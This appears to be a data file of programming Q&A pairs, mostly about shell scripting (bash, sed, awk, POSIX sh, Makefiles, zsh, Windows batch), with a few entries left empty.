    "What is the recommended POSIX sh shebang": "Formal perspective\nThe informative section of the POSIX specification for sh: Application Usage states that you cannot rely on the sh executable being installed at /bin/sh.\nApplications should note that the standard PATH to the shell cannot be assumed to be either /bin/sh or /usr/bin/sh, and should be determined by interrogation of the PATH returned by getconf PATH, ensuring that the returned pathname is an absolute pathname and not a shell built-in.\nFor example, to determine the location of the standard sh utility:\ncommand -v sh\nHowever, instead of suggesting the use of env to use the appropriate PATH, it suggests that shell scripts should be modified at installation time to use the full path to sh:\nFurthermore, on systems that support executable scripts (the \"#!\" construct), it is recommended that applications using executable scripts install them using getconf PATH to determine the shell pathname and update the \"#!\" script appropriately as it is being installed (for example, with sed).\nIn practice\nI mostly write POSIX shell scripts and, in practice, every GNU/Linux system (Red Hat and Debian-based) \u2013 and others such as Cygwin and OS X \u2013 has a POSIX-compliant sh either installed to /bin/sh or available as a soft or hard link at this path. I\u2019ve never needed to use env to cater for systems where sh does not use this path.\nThere may be some Unix systems where a POSIX-compliant sh is not available as /bin/sh. The POSIX specification suggests that it might be installed on some systems as /usr/xpg4/bin/sh. As I understand it, this is (was?) true for Solaris systems where /bin/sh is an earlier version of the Bourne shell which predates POSIX. In this case, using env sh would not be guaranteed to help as it could still find the Bourne shell (at /bin/sh) before the POSIX shell at /usr/xpg4/bin/sh.\nSummary\nIf you\u2019re writing POSIX shell scripts for common Unix and Linux operating systems, simply use #!/bin/sh as the shebang.\nIn rare cases where /bin/sh is a Bourne shell instead of a POSIX-compliant shell, you would have to modify the shebang to use the appropriate full path to the POSIX shell.\nIn either case, there\u2019s no benefit to using #!/usr/bin/env sh \u2013 and would be more likely to fail than simply using #!/bin/sh.",
    "How to write a shell in Python": "You should check out the cmd and cmd2 modules. I think they will do what you want. There was a PyCon talk about these.",
    "Integer addition in shell": "In bash, you don't need to do anything special:\n$ num=1\n$ num=$(( $num + 1 ))\n$ echo $num\n2",
    "Enable/Disable Fn keys from the command line on the Mac": "An AppleScript that should do the trick -- taken from http://scriptbuilders.net/files/fn1.1.html, with slight modifications\n--Check if GUI Scripting is Enabled\ntell application \"System Events\"\n    if not UI elements enabled then\n        set UI elements enabled to true\n    end if\nend tell\n\n--Enable/Disable \"Use all F1, F2, etc. keys as standard function keys\" option in Keyboard & Mouse Preference pane and close System Preferences\ntell application \"System Events\"\n    tell application \"System Preferences\"\n        reveal anchor \"keyboardTab\" of pane \"com.apple.preference.keyboard\"\n    end tell\n    click checkbox 1 of tab group 1 of window 1 of application process \"System Preferences\"\nend tell\nif application \"System Preferences\" is running then\n    tell application \"System Preferences\" to quit\nend if\nTested on MacOS 10.6.4",
    "How To Deploy Your PHP Applications Correctly?": "",
    "Running Python script with temporary environment variables": "In a shell, you could also simply temporarily assign the value(s) for the environment variable(s) right before calling the script. No need to change your script at all.\nConsider the following app.py which just prints the environment variables ENV_PARAM and ENV_PARAM2:\n#!/usr/bin/env python3\nimport os\n\nprint(os.environ['ENV_PARAM'])\nprint(os.environ['ENV_PARAM2'])\nWhen the vars are not set and you call it like this\npython app.py\nyou will get a KeyError.\nKeyError: 'ENV_PARAM'\nWhen you instead specify the values in the same line and call it like this\nENV_PARAM='foo' ENV_PARAM2='bar' python app.py\nit works fine. Output:\nfoo\nbar\nThis will not set the environment variable beyond that, so if you do\necho \"$ENV_PARAM\"  \nafterwards, it will return nothing. The environment variable was only set temporary, like you required.",
    "Sorting in bash": "You can use (where N is the column number and F is the input file):\ncut -f N F |sort |uniq -c |sort -nrk1,1 |awk '{print $2\" \"$1}'\nThe initial sort/uniq is to get each OS in the form <count> <os> so that the rest of the pipeline can work on it.\nThe sort -nrk1,1 sorts numerically (n), in reverse order (r), using the first field (-k1,1).\nThe awk then simply reverses the order of the columns. You can test the full pipeline with the following:\npax> cat test.in\na   Windows\nb   Linux\nc   Windows\nd   Windows\ne   Linux\nf   Windows\ng   MacOS\nh   Linux\ni   Windows\nj   MacOS\nk   Windows\nl   Linux\nm   MacOS\nn   Windows\no   Linux\np   MacOS\nq   Windows\nr   Linux\ns   Linux\nt   Linux\nu   Linux\nv   Linux\n\npax> cut -f2 test.in |sort |uniq -c |sort -nrk1,2 |awk '{print $2\" \"$1}'\nLinux 10\nWindows 8\nMacOS 4\nThis test file format is similar in style to your own input, including tabs separating the fields. It's unlikely to be the exact same format so you'll need to tailor the cut command to your own file, in such a way that it only gives you the desired column.\nHowever, you've probably already done that since that's not the bit you're asking about.",
    "Writing a Basic Shell": "It really depends on how simple your shell has to be. If you don't need job control (i.e. backgrounding) or pipes then it is very simple. Here is an example:\n#include <stdio.h>\n#include <stdlib.h>\n\n#define MAX_LENGTH 1024\n\nint main(int argc, char *argv[]) {\n  char line[MAX_LENGTH];\n\n  while (1) {\n    printf(\"$ \");\n    if (!fgets(line, MAX_LENGTH, stdin)) break;\n    system(line);\n  }\n\n  return 0;\n}\nYou can exit from the above example with CTRL-D. To add built-in commands like exit or cd you would have to tokenize the line using strtok() and look at the first token. Here is a more complicated example with those commands added:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <errno.h>\n\n#ifdef _WIN32\n#include <windows.h>\n#define chdir _chdir\n\n#else\n#include <unistd.h>\n#endif\n\n#define MAX_LENGTH 1024\n#define DELIMS \" \\t\\r\\n\"\n\nint main(int argc, char *argv[]) {\n  char *cmd;\n  char line[MAX_LENGTH];\n\n  while (1) {\n    printf(\"$ \");\n    if (!fgets(line, MAX_LENGTH, stdin)) break;\n\n    // Parse and execute command\n    if ((cmd = strtok(line, DELIMS))) {\n      // Clear errors\n      errno = 0;\n\n      if (strcmp(cmd, \"cd\") == 0) {\n        char *arg = strtok(0, DELIMS);\n\n        if (!arg) fprintf(stderr, \"cd missing argument.\\n\");\n        else chdir(arg);\n\n      } else if (strcmp(cmd, \"exit\") == 0) {\n        break;\n\n      } else system(line);\n\n      if (errno) perror(\"Command failed\");\n    }\n  }\n\n  return 0;\n}\nYou could extend this by adding more build-in commands or by supporting things like cd with out arguments to change to your home directory. You could also improve the command prompt by adding information such as the current directory.\nAs a side note, an easy way to add a command history and line editing features is to use the GNU readline library.",
    "$${HOME} or ${HOME} in Makefile?": "Yes and no. It is best to use $$ to be explicit. However, there is a special rule for environment variables:\nVariables in make can come from the environment in which make is run. Every environment variable that make sees when it starts up is transformed into a make variable with the same name and value. But an explicit assignment in the makefile, or with a command argument, overrides the environment. (If the `-e' flag is specified, then values from the environment override assignments in the makefile. See section Summary of Options. But this is not recommended practice.)",
    "How to source shell script with npm scripts?": "Total guess, but try\n{\n \"scripts\": {\n    \"start\": \"bash -c 'source run-nvm.sh && ...'\"\n  }\n}",
    "How can I identify partitions of an Android device from the shell?": "",
    "How to fix \"sh: 0: Can't open start.sh\" in docker file?": "Your mounting your volume to the /selenium folder in your container. Therefor the start.sh file isn't going to be in your working directory its going to be in /selenium. You want to mount your volume to a selenium folder inside your working directory then make sure the command references this new path.\nIf you use docker-compose the YAML-file to run the container would look something like this:\nversion: '3'\n\nservices:\n  start:\n    image: ${DOCKER_IMAGE}\n    command: sh selenium/start.sh\n    volumes:\n      - .:/work/selenium",
    "How to set tab for zsh autocompletion?": "For all of you that are struggling with the accepted answer, I got it to work doing the following:\nbindkey '^I' autosuggest-accept\n...where '^I' is tab.",
    "How can I find the sum of the elements of an array in Bash?": "read -a array\ntot=0\nfor i in ${array[@]}; do\n  let tot+=$i\ndone\necho \"Total: $tot\"",
    "Each word on a separate line": "A couple ways to go about it, choose your favorite!\necho \"This is for example\" | tr ' ' '\\n' > example.txt\nor simply do this to avoid using echo unnecessarily:\ntr ' ' '\\n' <<< \"This is for example\" > example.txt\nThe <<< notation is used with a herestring\nOr, use sed instead of tr:\nsed \"s/ /\\n/g\" <<< \"This is for example\" > example.txt\nFor still more alternatives, check others' answers =)",
    "Change konsole tab title from command line and make it persistent?": "You may need to use this variant:\necho -ne \"\\033]30;test change title\\007\"\n$ konsole -v\nQt: 4.8.6\nKDE Development Platform: 4.13.3\nKonsole: 2.13.2",
    "Extract lines between two line numbers in shell": "Using sed:\n$ cat my_file_path | sed -n \"${line1},${line2}p\"\nor, even better (cat is somehow redundant):\n$ sed -n \"${line1},${line2}p\" my_file_path",
    "Start MongoDB from within a Grunt task": "You can use grunt-shell-spawn to do this. The previous answer recommends grunt-shell, which runs synchronously on the main process - blocking execution of other tasks.\nshell: {\n    mongo: {\n        command: 'mongod',\n        options: {\n            async: true\n        }\n    }\n}",
    "BASH scripting: n-th parameter of $@ when the index is a variable?": "You can use variable indirection. It is independent of arrays, and works fine in your example:\nn=2\necho \"${!n}\"\nEdit: Variable Indirection can be used in a lot of situations. If there is a variable foobar, then the following two variable expansions produce the same result:\n$foobar\n\nname=foobar\n${!name}",
    "bash: run a command for n minutes, then SIGHUP it": "See the timeout command now in most GNU/Linux distros.\ntimeout -sHUP 10m command\nThe same functionality can be achieved with http://www.pixelbeat.org/scripts/timeout",
    "How do I use Head and Tail to print specific lines of a file": "head -n XX # <-- print first XX lines\ntail -n YY # <-- print last YY lines\nIf you want lines from 20 to 30 that means you want 11 lines starting from 20 and finishing at 30:\nhead -n 30 file | tail -n 11\n# \n# first 30 lines\n#                 last 11 lines from those previous 30\nThat is, you firstly get first 30 lines and then you select the last 11 (that is, 30-20+1).\nSo in your code it would be:\nhead -n $3 $1 | tail -n $(( $3-$2 + 1 ))\nBased on firstline = $2, lastline = $3, filename = $1\nhead -n $lastline $filename | tail -n $(( $lastline -$firstline + 1 ))",
    "Parse HTML using shell": "awk is not an HTML parser. Use xpath or even xslt for that. xmllint is a commandline tool which is able to execute XPath queries and xsltproc can be used to perform XSL transformations. Both tools belong to the package libxml2-utils.\nAlso you can use a programming language which is able to parse HTML",
    "How to determine which IPs in a given range have port 80 using nmap?": "nmap comes with a nice output parameter -oG (grepable output) which makes parsing more easy. Also it is not necessary to iterate through all IP addresses you want to scan. nmap is netmask aware.\nYour example can be written as:\nnmap -p80 192.168.0.0/24 -oG - | grep 80/open\nThe -oG enables the grepable output, and - specifies the file to output to (in this case stdout). The pipe symbol redirects the output of nmap (stdout) to grep, which only returns lines containing 80/open in this case.",
    "Unset all environment variables starting with a leading string while in a script (without closing or restarting Bash)": "In the Bash shell, the ${!prefix@} parameter expansion generates all variables that start with prefix.\n${!prefix@} Expands to the names of variables whose names begin with prefix [...] When @ is used and the expansion appears within double quotes, each variable name expands to a separate word.\nThis list can then be passed to unset:\nunset \"${!myvarname@}\"",
    "Shell script to know whether a filesystem is already mounted": "There's a tool specifically for this: mountpoint(1)\nif mountpoint -q \"$directory\" ; then\n    echo it is a mounted mountpoint\nelse\n    echo it is not a mounted mountpoint\nfi\nAnd you don't even have to scrape strings to do it!\nNote that I find this tool in Debian's initscripts package. How available it is elsewhere is not something I can comment on.",
    "Using Environment Variables in cURL Command - Unix": "Single quotes inhibit variable substitution, so use double quotes. The inner double quotes must then be escaped.\n...  -d \"{\\\"username\\\":\\\"$USERNAME\\\",\\\"password\\\":\\\"$PASSWORD\\\"}\"\nSince this answer was written in 2015, it has become clear that this technique is insufficient to properly create JSON:\n$ USERNAME=person1\n$ PASSWORD=\"some \\\"gnarly 'password\"\n$ echo \"{\\\"username\\\":\\\"$USERNAME\\\",\\\"password\\\":\\\"$PASSWORD\\\"}\"\n{\"username\":\"person1\",\"password\":\"some \"gnarly 'password\"}\n$ echo \"{\\\"username\\\":\\\"$USERNAME\\\",\\\"password\\\":\\\"$PASSWORD\\\"}\" | jq .\nparse error: Invalid numeric literal at line 1, column 47\nThe quoting problem are clear. The (shell) solutions are not\nCurrent best practice: use a JSON-specific tool to create JSON:\njq\n$ jq -n -c --arg username \"$USERNAME\" --arg password \"$PASSWORD\" '$ARGS.named'\n{\"username\":\"person1\",\"password\":\"some \\\"gnarly 'password\"}\njo\n$ jo \"username=$USERNAME\" \"password=$PASSWORD\"\n{\"username\":\"person1\",\"password\":\"some \\\"gnarly 'password\"}\nAnd with curl:\njson=$( jq -n -c --arg username \"$USERNAME\" --arg password \"$PASSWORD\" '$ARGS.named' )\n# or\njson=$( jo \"username=$USERNAME\" \"password=$PASSWORD\" )\n\n# then\ncurl ... -d \"$json\"",
    "how to execute redis command in shell": "Please note that Konstantin\u2019s answer is better.\nJust use echo with redis-cli like this:\n# Delete list of cores\necho DEL cores | redis-cli\n\n# Add a new core to the list of cores\necho LPUSH cores 1 | redis-cli \n\n# Wait forever for a core to become available\necho BLPOP cores 0 | redis-cli",
    "Can I get the absolute path to the current script in KornShell?": "You could use:\n## __SCRIPTNAME - name of the script without the path\n##\ntypeset -r __SCRIPTNAME=\"${0##*/}\"\n\n## __SCRIPTDIR - path of the script (as entered by the user!)\n##\n__SCRIPTDIR=\"${0%/*}\"\n\n## __REAL_SCRIPTDIR - path of the script (real path, maybe a link)\n##\n__REAL_SCRIPTDIR=$( cd -P -- \"$(dirname -- \"$(command -v -- \"$0\")\")\" && pwd -P )",
    "How to get the file diff between two S3 buckets?": "",
    "Copy and overwrite a file in shell script": "Use\ncp -fr /source/file /destination\nthis should probably solve the problem.",
    "How do I write a command-line interactive PHP script?": "",
    "Run three shell script simultaneously": "you want this?\n$ sh -x script1.sh & sh -x script2.sh & sh -x script3.sh &\nUpdate explanation :\nRun each script in background mode so that next command is run without waiting for current command to complete.\n'&' makes the scripts run in background so that prompt does not wait for it to complete\n'&' also can be used to chain commands on one line similar to running commands one by one on command line.",
    "Get a range of lines from a file given the start and end line numbers": "To print lines 6-10:\nsed -n '6,10p' file\nIf the file is huge, and the end line number is small compared to the number of lines, you can make it more efficient by:\nsed -n '10q;6,10p' file\nFrom testing a file with a fairly large number of lines:\n$ wc -l test.txt \n368048 test.txt\n$ du -k test.txt \n24640    test.txt\n$ time sed -n '10q;6,10p' test.txt >/dev/null\nreal   0m0.005s\nuser   0m0.001s\nsys    0m0.003s\n$ time sed -n '6,10p' test.txt >/dev/null\nreal   0m0.123s\nuser   0m0.092s\nsys    0m0.030s",
    "How to use svn+ssh with Tortoise SVN from the command line": "For svn+ssh to work with Tortoise, make sure %SVN_SSH% is set to your ssh client (probably plink.exe from Tortoise or Putty) and the path must be written either with forward slashes / or with escaped backslashes \\\\.\nTry to set %SVN_SSH% with the absolute path of plink while escaping the backslashes, something like C:\\\\Program Files\\\\TortoiseSVN\\\\bin\\\\TortoisePlink.exe instead of ..\\TortoisePlink.exe",
    "How can I run Android camera application from adb shell?": "",
    "mkdir error in bash script": "Change:\nmkdir -p $deploydir\nto\nmkdir -p \"$deployDir\"\nLike most Unix shells (maybe even all of them), Bourne (Again) Shell (sh/bash) is case-sensitive. The dir var is called deployDir (mixed-case) everywhere except for the mkdir command, where it is called deploydir (all lowercase). Since deploydir (all lowercase) is a considered distinct variable from deployDir (mixed-case) and deplydir (all lowercase) has never had a value assigned to it, the value of deploydir (all lowercase) is empty string (\"\").\nWithout the quotes (mkdir $deploydir), the line effectively becomes mkdir (just the command without the required operand), thus the error mkdir: missing operand.\nWith the quotes (mkdir \"$deploydir\"), the line effectively becomes mkdir \"\" (the command to make a directory with the illegal directory name of empty string), thus the error mkdir: cannot create directory'.\nUsing the form with quotes (mkdir \"$deployDir\") is recommended in case the target directory name includes spaces.",
    "How to compare files with same names in two different directories using a shell script": "The diff command has a -r option to recursively compare directories:\ndiff -r /develop /main",
    "How to make quick backup of untracked files which I want to delete by git clean?": "The following command will create a tar archive in your home directory of all of the untracked (and not ignored) files in your directory:\ngit ls-files --others --exclude-standard -z | xargs -0 tar rvf ~/backup-untracked.tar\nIf you're going to use this technique, check carefully that git ls-files --others --exclude-standard on its own produces the list of files you expect!\nA few notes on this solution might be in order:\nI've used -z to get git ls-files to output the list of files with NUL (a zero byte) as the separator between files, and the -0 parameter to xargs tells it to consider NUL to be the separator between the parameters it reads from standard input. This is a standard trick to deal with the possibility that a filename might contain a newline, since the only two bytes that aren't allowed in filenames on Linux are NUL and /.\nIf you have a huge number of untracked files then xargs will run the tar command more than once, so it's important that I've told tar to append files (r) rather than create a new archive (c), otherwise the later invocations of tar will overwrite the archive created just before.",
    "What do the fields in ls -ali output mean [closed]": "index\nnumber file\npermissions number\nof links owner group size month day time filename\n933442 -rwxrw-r-- 10 root root 2048 Jan 13 07:11 afile.exe\nNote: month, day and time is the date of last modification.",
    "How to edit a kubernetes resource from a shell script": "Your command is missing a backtick. But even though you put it there, it won't work. The reason is because when you do kubectl edit ..., it edits the file on vim. I am not sure sed would work on vim though. Even though if it does, the output goes to a file, so you get the Vim: Warning: Output is not to a terminal error, which I don't know how to solve.\nI would recommend you to get the file and save it. Replace the desired parameters and run it again:\nkubectl get deploy tiller-deploy -n kube-system -o yaml > tiller.yaml && sed -i \"s/automountServiceAccountToken:.*$/automountServiceAccountToken: true/g\" tiller.yaml && kubectl replace -f tiller.yaml\nI tried the command above and it worked.\nNote: no need to add -n kube-system as the yaml file already contains the namespace.",
    "How to run multiple commands via START command": "I think, you need something like:\nstart \"MyWindow\" cmd /c \"ping localhost & ipconfig & pause\"",
    "Pick and print one of three strings at random in Bash script": "To generate random numbers with bash use the $RANDOM internal Bash function:\narr[0]=\"2 million\"\narr[1]=\"1 million\"\narr[2]=\"3 million\"\n\nrand=$[ $RANDOM % 3 ]\necho ${arr[$rand]}\nFrom bash manual for RANDOM:\nEach time this parameter is referenced, a random integer between 0 and 32767 is generated. The sequence of random numbers may be initialized by assigning a value to RANDOM. If RANDOM is unset,it loses its special properties, even if it is subsequently reset.",
    "How to convert Linux's shell output to HTML?": "There's ansifilter plus some tools like highlight will produce colorized html from plain text such as source files.\nBoth available here.",
    "Add suffix to each line with shell script": "Use awk:\nawk 'NF{print $0 \" done\"}' inFile\nOR sed with inline flag:\nsed -i.bak '!/[^[:blank:]]/s/$/ done/' inFile",
    "External variable in awk": "You pass an external variable for use in awk with the -v option:\nsome_variable=3\nawk -v x=$some_variable '$2 == x {print $1}' infile\nAlso note that you need to change your code from $2=$x to $2 == x\nUse == instead =: the latter is assignment\nDo not prefix normal variables with $ inside the awk script.\nAside: You need to specify one -v for each variable you want to pass in, e.g:\nvar1=2\nvar2=4\nawk -v x=$var1 -v y=$var2 '$2 == x {print y \" \" $1}' infile",
    "Checking in bash and csh if a command is builtin": "You can try using which in csh or type in bash. If something is a built-in command, it will say so; otherwise, you get the location of the command in your PATH.\nIn csh:\n# which echo\necho: shell built-in command.\n\n# which parted\n/sbin/parted\nIn bash:\n# type echo\necho is a shell builtin\n\n# type parted\nparted is /sbin/parted\ntype might also show something like this:\n# type clear\nclear is hashed (/usr/bin/clear)\n...which means that it's not a built-in, but that bash has stored its location in a hashtable to speed up access to it; (a little bit) more in this post on Unix & Linux.",
    "How do I use the Ant exec task to run piped commands?": "If you use sh -c as Aaron suggests, you can pass the whole pipeline as a single arg, effectively doing:\nsh -c \"ls -l foo/bar | wc -l\"\nIf you use separate args, they are consumed by sh, not passed through to ls (hence you see just the current directory).\nNote that on my system, ls -l includes a total as well as a list of the files found, which means the count shown is one more than the number of files. So suggest:\n<exec executable=\"sh\" outputproperty=\"noOfFiles\">\n    <arg value=\"-c\" />\n    <arg value=\"ls foo/bar | wc -l\" />\n</exec>",
    "Rounding up float point numbers bash": "In case input contains a number, there is no need for an external command like bc. You can just use printf:\nprintf \"%.3f\\n\" \"$input\"\nEdit: In case the input is a formula, you should however use bc as in one of the following commands:\nprintf \"%.3f\\n\" $(bc -l <<< \"$input\")\nprintf \"%.3f\\n\" $(echo \"$input\" | bc -l)",
    "How to run an application as shell replacement on Windows 10 Enterprise": "I had the same problem right now. And yes, Microsoft has changed the way to do a shell replacement. You can install and use the Embedded Shell Launcher to customize windows as you like it for kiosk mode. But this is only available for Enterprise and Education.\nIf you don't want to buy the Enterprise version you can use the already known registry locations in HKCU and HKLM. https://msdn.microsoft.com/en-us/library/ms838576(v=WinEmbedded.5).aspx\nBut wait, oh no since Windows 10 it is only possible to use Microsoft signed applications, so your normal .net application isn't started and the screen keeps being black after login. But we've figured out a workaround.\nJust use a Batch-File as bootstrapping. If you set the registry keys you like to a Batch-File and the Batch-File starts the real application, then it works like a charm.\n@echo off\necho Bootstrapping, please wait ...\nstart /b \"Bootstrap\" \"C:\\vmwatcher\\VMViewClientWatcher.exe\"",
    "What is the difference between \"else if\" and \"elif\" in bash?": "Your code as posted seems to work.\nThere is a difference between elif .. fi AND else ; if ... fi. A true elif ... fi will have one fewer fi at the end than your code.\nYour code as posted, asks, \"if hcm.ear exists THEN check if there is an hcm.war\". Is that what you want? The other logic path to test would be \"if hcm.ear doesn't exist THEN check if there an hcm.war.\"\nThat alternate logic path looks like\n  if [ -e hcm.ear ] ; then\n    cp -v hcm.ear $DEPLOY_PATH/hcm.ear\n    HCM_DEPLOYED=true\n  elif [ -e hcm.war ] ; then\n      cp -v hcm.war $DEPLOY_PATH/hcm.war\n      HCM_DEPLOYED=true\n  else \n    echo $M_MISSING_HCM\n  fi\nI hope this helps.",
    "Append git's branch name to command prompt": "The trick to get the quoting right is to have eveything double-quoted, except for $(__git_ps1 \"(%s)\"), which is single-quoted.\nsource ~/.git-completion.bash\nfunction prompt\n{\nlocal WHITE=\"\\[\\033[1;37m\\]\"\nlocal GREEN=\"\\[\\033[0;32m\\]\"\nlocal CYAN=\"\\[\\033[0;36m\\]\"\nlocal GRAY=\"\\[\\033[0;37m\\]\"\nlocal BLUE=\"\\[\\033[0;34m\\]\"\nexport PS1=\"\n${GREEN}\\u${CYAN}@${BLUE}\\h ${CYAN}\\w\"' $(__git_ps1 \"(%s)\") '\"${GRAY}\"\n}\nprompt\nAn alternative solution is to replace $( with \\$( in the code in the question.\nBackground information: Two substitutions take place: first at export PS1=\"...\" time, and later when the prompt is displayed. You want to execute __git_ps1 each time the prompt is displayed, so you have to make sure that the first substitution keeps $(...) intact. So you write either '$(...)' or \"\\$(...)\". These are the two basic ideas behind the solutions I've proposed.",
    "Shell Scripting If [ -f ./file ]": "From bash manual:\n  -f file - True if file exists and is a regular file.\nSo yes, -f means file (./$NAME.tar in your case) exists and is a regular file (not a device file or a directory for example).",
    "how to use grep to match with either whitespace or newline": "If you are looking for word AAA followed by space anywhere in the string, or at the end of line, then use\ngrep -P \"AAA( |$)\"",
    "What is the best way to write a wrapper function that runs commands and logs their exit code": "\"$@\"\nFrom http://www.gnu.org/software/bash/manual/bashref.html#Special-Parameters:\n@\nExpands to the positional parameters, starting from one. When the expansion occurs within double quotes, each parameter expands to a separate word. That is, \"$@\" is equivalent to \"$1\" \"$2\" .... If the double-quoted expansion occurs within a word, the expansion of the first parameter is joined with the beginning part of the original word, and the expansion of the last parameter is joined with the last part of the original word. When there are no positional parameters, \"$@\" and $@ expand to nothing (i.e., they are removed).\nThis means spaces in the arguments are re-quoted correctly.\ndo_cmd()\n{\n    \"$@\"\n    ret=$?\n    if [[ $ret -eq 0 ]]\n    then\n        echo \"Successfully ran [ $@ ]\"\n    else\n        echo \"Error: Command [ $@ ] returned $ret\"\n        exit $ret\n    fi\n}",
    "Javascript interpreter to replace Python": "I personally use SpiderMonkey, but here's an extensive list of ECMAScript shells\nExample spidermonkey install and use on Ubuntu:\n$ sudo apt-get install spidermonkey\n$ js myfile.js\noutput\n$ js\njs> var f = function(){};\njs> f();",
    "Bash - How to print multi line strings (with '\\n') using printf": "Here's another variation.\nprintf '%s\\n' 'first line here' 'second line here'\nYou can add an arbitrary number of arguments; printf will repeat the format string until all arguments are exhausted.\nprintf '%s\\n' '#!/bin/sh' \\\n    'for x; do' \\\n    '    echo \"Welcome to my script!\"' \\\n    'done' >script.sh",
    "What's the Windows command shell equivalent of Bash's `true` command?": "VER>NUL\nworks for me.\nFor example,\nMKDIR . || VER>NUL\nissues an error message, but it sets %ERRORLEVEL% to 0.",
    "What happens if a user exits the browser or changes page before an AJAX request is over": "",
    "diff'ing diffs with diff?": "Use interdiff from patchutils.",
    "Hudson : \"yes: standard output: Broken pipe\"": "",
    "How to add an integer number and a float number in a bash shell script": "echo 1 + 3.5 | bc\n\nawk \"BEGIN {print 1+3.5; exit}\"\n\npython -c \"print 1+3.5\"\n\nperl -e \"print 1+3.5\"\nJust replace the numbers with your variables, eg: echo $n1 + $n2 | bc",
    "iTerm2 Shell Integration and Oh My Zsh Conflicts": "Late answer but this worked for me.\nThe iTerm2 Shell Integrations page has you download the install script and pipe it into bash.\nInstead, download it locally and modify it so it knows you are using ZSH.\nFirst, download the script\nwget https://iterm2.com/misc/install_shell_integration.sh\nThen, instead of having the script determine the shell just define it as \"zsh\"\n# comment out this line\n# SHELL=$(echo \"${SHELL}\" | tr / \"\\n\" | tail -1)\n\n# replace it with this line\nSHELL=\"zsh\"\nNext, make the install script executable and then run it\nchmod +x install_shell_integration.sh\n./install_shell_integration.sh\nAfter that the integration should be installed properly.\nNote Remove the Bash integration if you don't need it.\nrm ~/.iterm2_shell_integration.bash",
    "Permission denied with bash.sh to run cron": "",
    "Getting the Canonical Time Zone name in shell script": "This is more complicated than it sounds. Most linux distributions do it differently so there is no 100% reliable way to get the Olson TZ name.\nBelow is the heuristic that I have used in the past:\nFirst check /etc/timezone, if it exists use it.\nNext check if /etc/localtime is a symlink to the timezone database\nOtherwise find a file in /usr/share/zoneinfo with the same content as the file /etc/localtime\nUntested example code:\nif [ -f /etc/timezone ]; then\n  OLSONTZ=`cat /etc/timezone`\nelif [ -h /etc/localtime ]; then\n  OLSONTZ=`readlink /etc/localtime | sed \"s/\\/usr\\/share\\/zoneinfo\\///\"`\nelse\n  checksum=`md5sum /etc/localtime | cut -d' ' -f1`\n  OLSONTZ=`find /usr/share/zoneinfo/ -type f -exec md5sum {} \\; | grep \"^$checksum\" | sed \"s/.*\\/usr\\/share\\/zoneinfo\\///\" | head -n 1`\nfi\n\necho $OLSONTZ\nNote that this quick example does not handle the case where multiple TZ names match the given file (when looking in /usr/share/zoneinfo). Disambiguating the appropriate TZ name will depend on your application.\n-nick",
    "Shell Script that does chroot and execute commands in chroot": "When you run chroot without telling it what to do, it will try to start chrooted interactive shell session. So your script would \"pause\" at that point and when you are done with that interactive shell session, it continues out of chroot again.\nOne of the quick and dirt options would be to abuse here-document, like this:\nchroot /home/mayank/chroot/codebase /bin/bash <<\"EOT\"\ncd /tmp/so\nls -l\necho $$\nEOT\nWhich takes all lines up to EOT and feeds them into bash started through chroot. Those double quotes around \"EOT\" should ensure bash passes the content not trying to expand variables and such. Hence that echo $$ should be PID of the inner chrooted bash.",
    "source a shell script from another script and check return code": "File does not need to be executable to run sh name.sh. Than use $?.\nsh name.sh\nret_code=$?",
    "changing to parent directory in unix": "This function is for Bash, but something similar could be done for others (this may work as-is in ksh and zsh):\ncdn () { pushd .; for ((i=1; i<=$1; i++)); do cd ..; done; pwd; }\nExample usage:\n/some/dirs/and/subdirs$ cdn 3\n/some/dirs/and/subdirs /some/dirs/and/subdirs\n/some\n/some$ popd\n/some/dirs/and/subdirs$\nHere's a function that will cd to a named subdirectory above the current working directory:\ncdu () { cd \"${PWD%/$1/*}/$1\"; }\nExample usage:\n/usr/share/atom/resources/app/apm/src/generator$ cdu apm\n/usr/share/atom/resources/app/apm$ cdu resources\n/usr/share/atom/resources$ cd -\n/usr/share/atom/resources/app/apm$ cdu share\n/usr/share",
    "Renaming a set of files to 001, 002,": "If I understand right, you have e.g. image_001.jpg, image_003.jpg, image_005.jpg, and you want to rename to image_001.jpg, image_002.jpg, image_003.jpg.\nEDIT: This is modified to put the temp file in the current directory. As Stephan202 noted, this can make a significant difference if temp is on a different filesystem. To avoid hitting the temp file in the loop, it now goes through image*\ni=1; temp=$(mktemp -p .); for file in image*\ndo\nmv \"$file\" $temp;\nmv $temp $(printf \"image_%0.3d.jpg\" $i)\ni=$((i + 1))\ndone                                      ",
    "How to run a shell command through vimscript?": "vim has a a system() function:\n:call system('date')",
    "Why is a tilde in a path not expanded in a shell script?": "In the bash manual, note that brace expansion occurs during parameter substitution, but not recursively:\nThe order of expansions is: brace expansion; tilde expansion, parameter and variable expansion, arithmetic expansion, and command substitution (done in a left-to-right fashion); word splitting; and filename expansion.\nThe POSIX standard supplied by The Open Group lists this behavior in section 2.6 as well.\nThis implies that any tilde (or parameter references or command substitution) stored unexpanded in a bash variable will not automatically resolve. Your JAVA_HOME variable contains a literal tilde, so bash will not expand it automatically.\nIt is likely that your fix worked because tilde expansion does not apply in quotes:\n$ echo \"~\"\n~\n$ echo ~\n/home/jeffbowman\n...but parameter expansion like $HOME does occur in quotes. Replacing it with $HOME expands to your home directory during the assignment of JAVA_HOME. Remember that quotes in bash can start mid-word.\nFOO=~/bar             # stores /home/jeffbowman/bar\nFOO=~jeffbowman/bar   # stores /home/jeffbowman/bar\nFOO=~\"jeffbowman\"/bar # stores ~jeffbowman/bar\nFOO=~\"/bar\"           # stores ~/bar\nFOO=\"~/bar\"           # stores ~/bar\nFOO=$HOME/bar         # stores /home/jeffbowman/bar\nFOO=\"$HOME/bar\"       # stores /home/jeffbowman/bar\nThough the better option is to ensure your assignment is correct, if you want to expand it manually, these SO questions have some good options:\n\"Tilde expansion in quotes\"\n\"How to manually expand a special variable (ex: ~ tilde) in bash\"\nNote that it's not only the quoting status of the tilde itself that is pertinent: all characters up to the first unquoted slash (should one exist) are considered a \"tilde-prefix\", and only if none of the characters in that prefix were quoted is expansion as a login name considered.",
    "If xargs is map, what is filter?": "If map is xargs, filter is... still xargs.\nExample: list files in the current directory and filter out non-executable files:\nls | xargs -I{} sh -c \"test -x '{}' && echo '{}'\"\nThis could be made handy trough a (non production-ready) function:\nxfilter() {\n    xargs -I{} sh -c \"$* '{}' && echo '{}'\"\n}\nls | xfilter test -x\nAlternatively, you could use a parallel filter implementation via GNU Parallel:\nls | parallel \"test -x '{}' && echo '{}'\"",
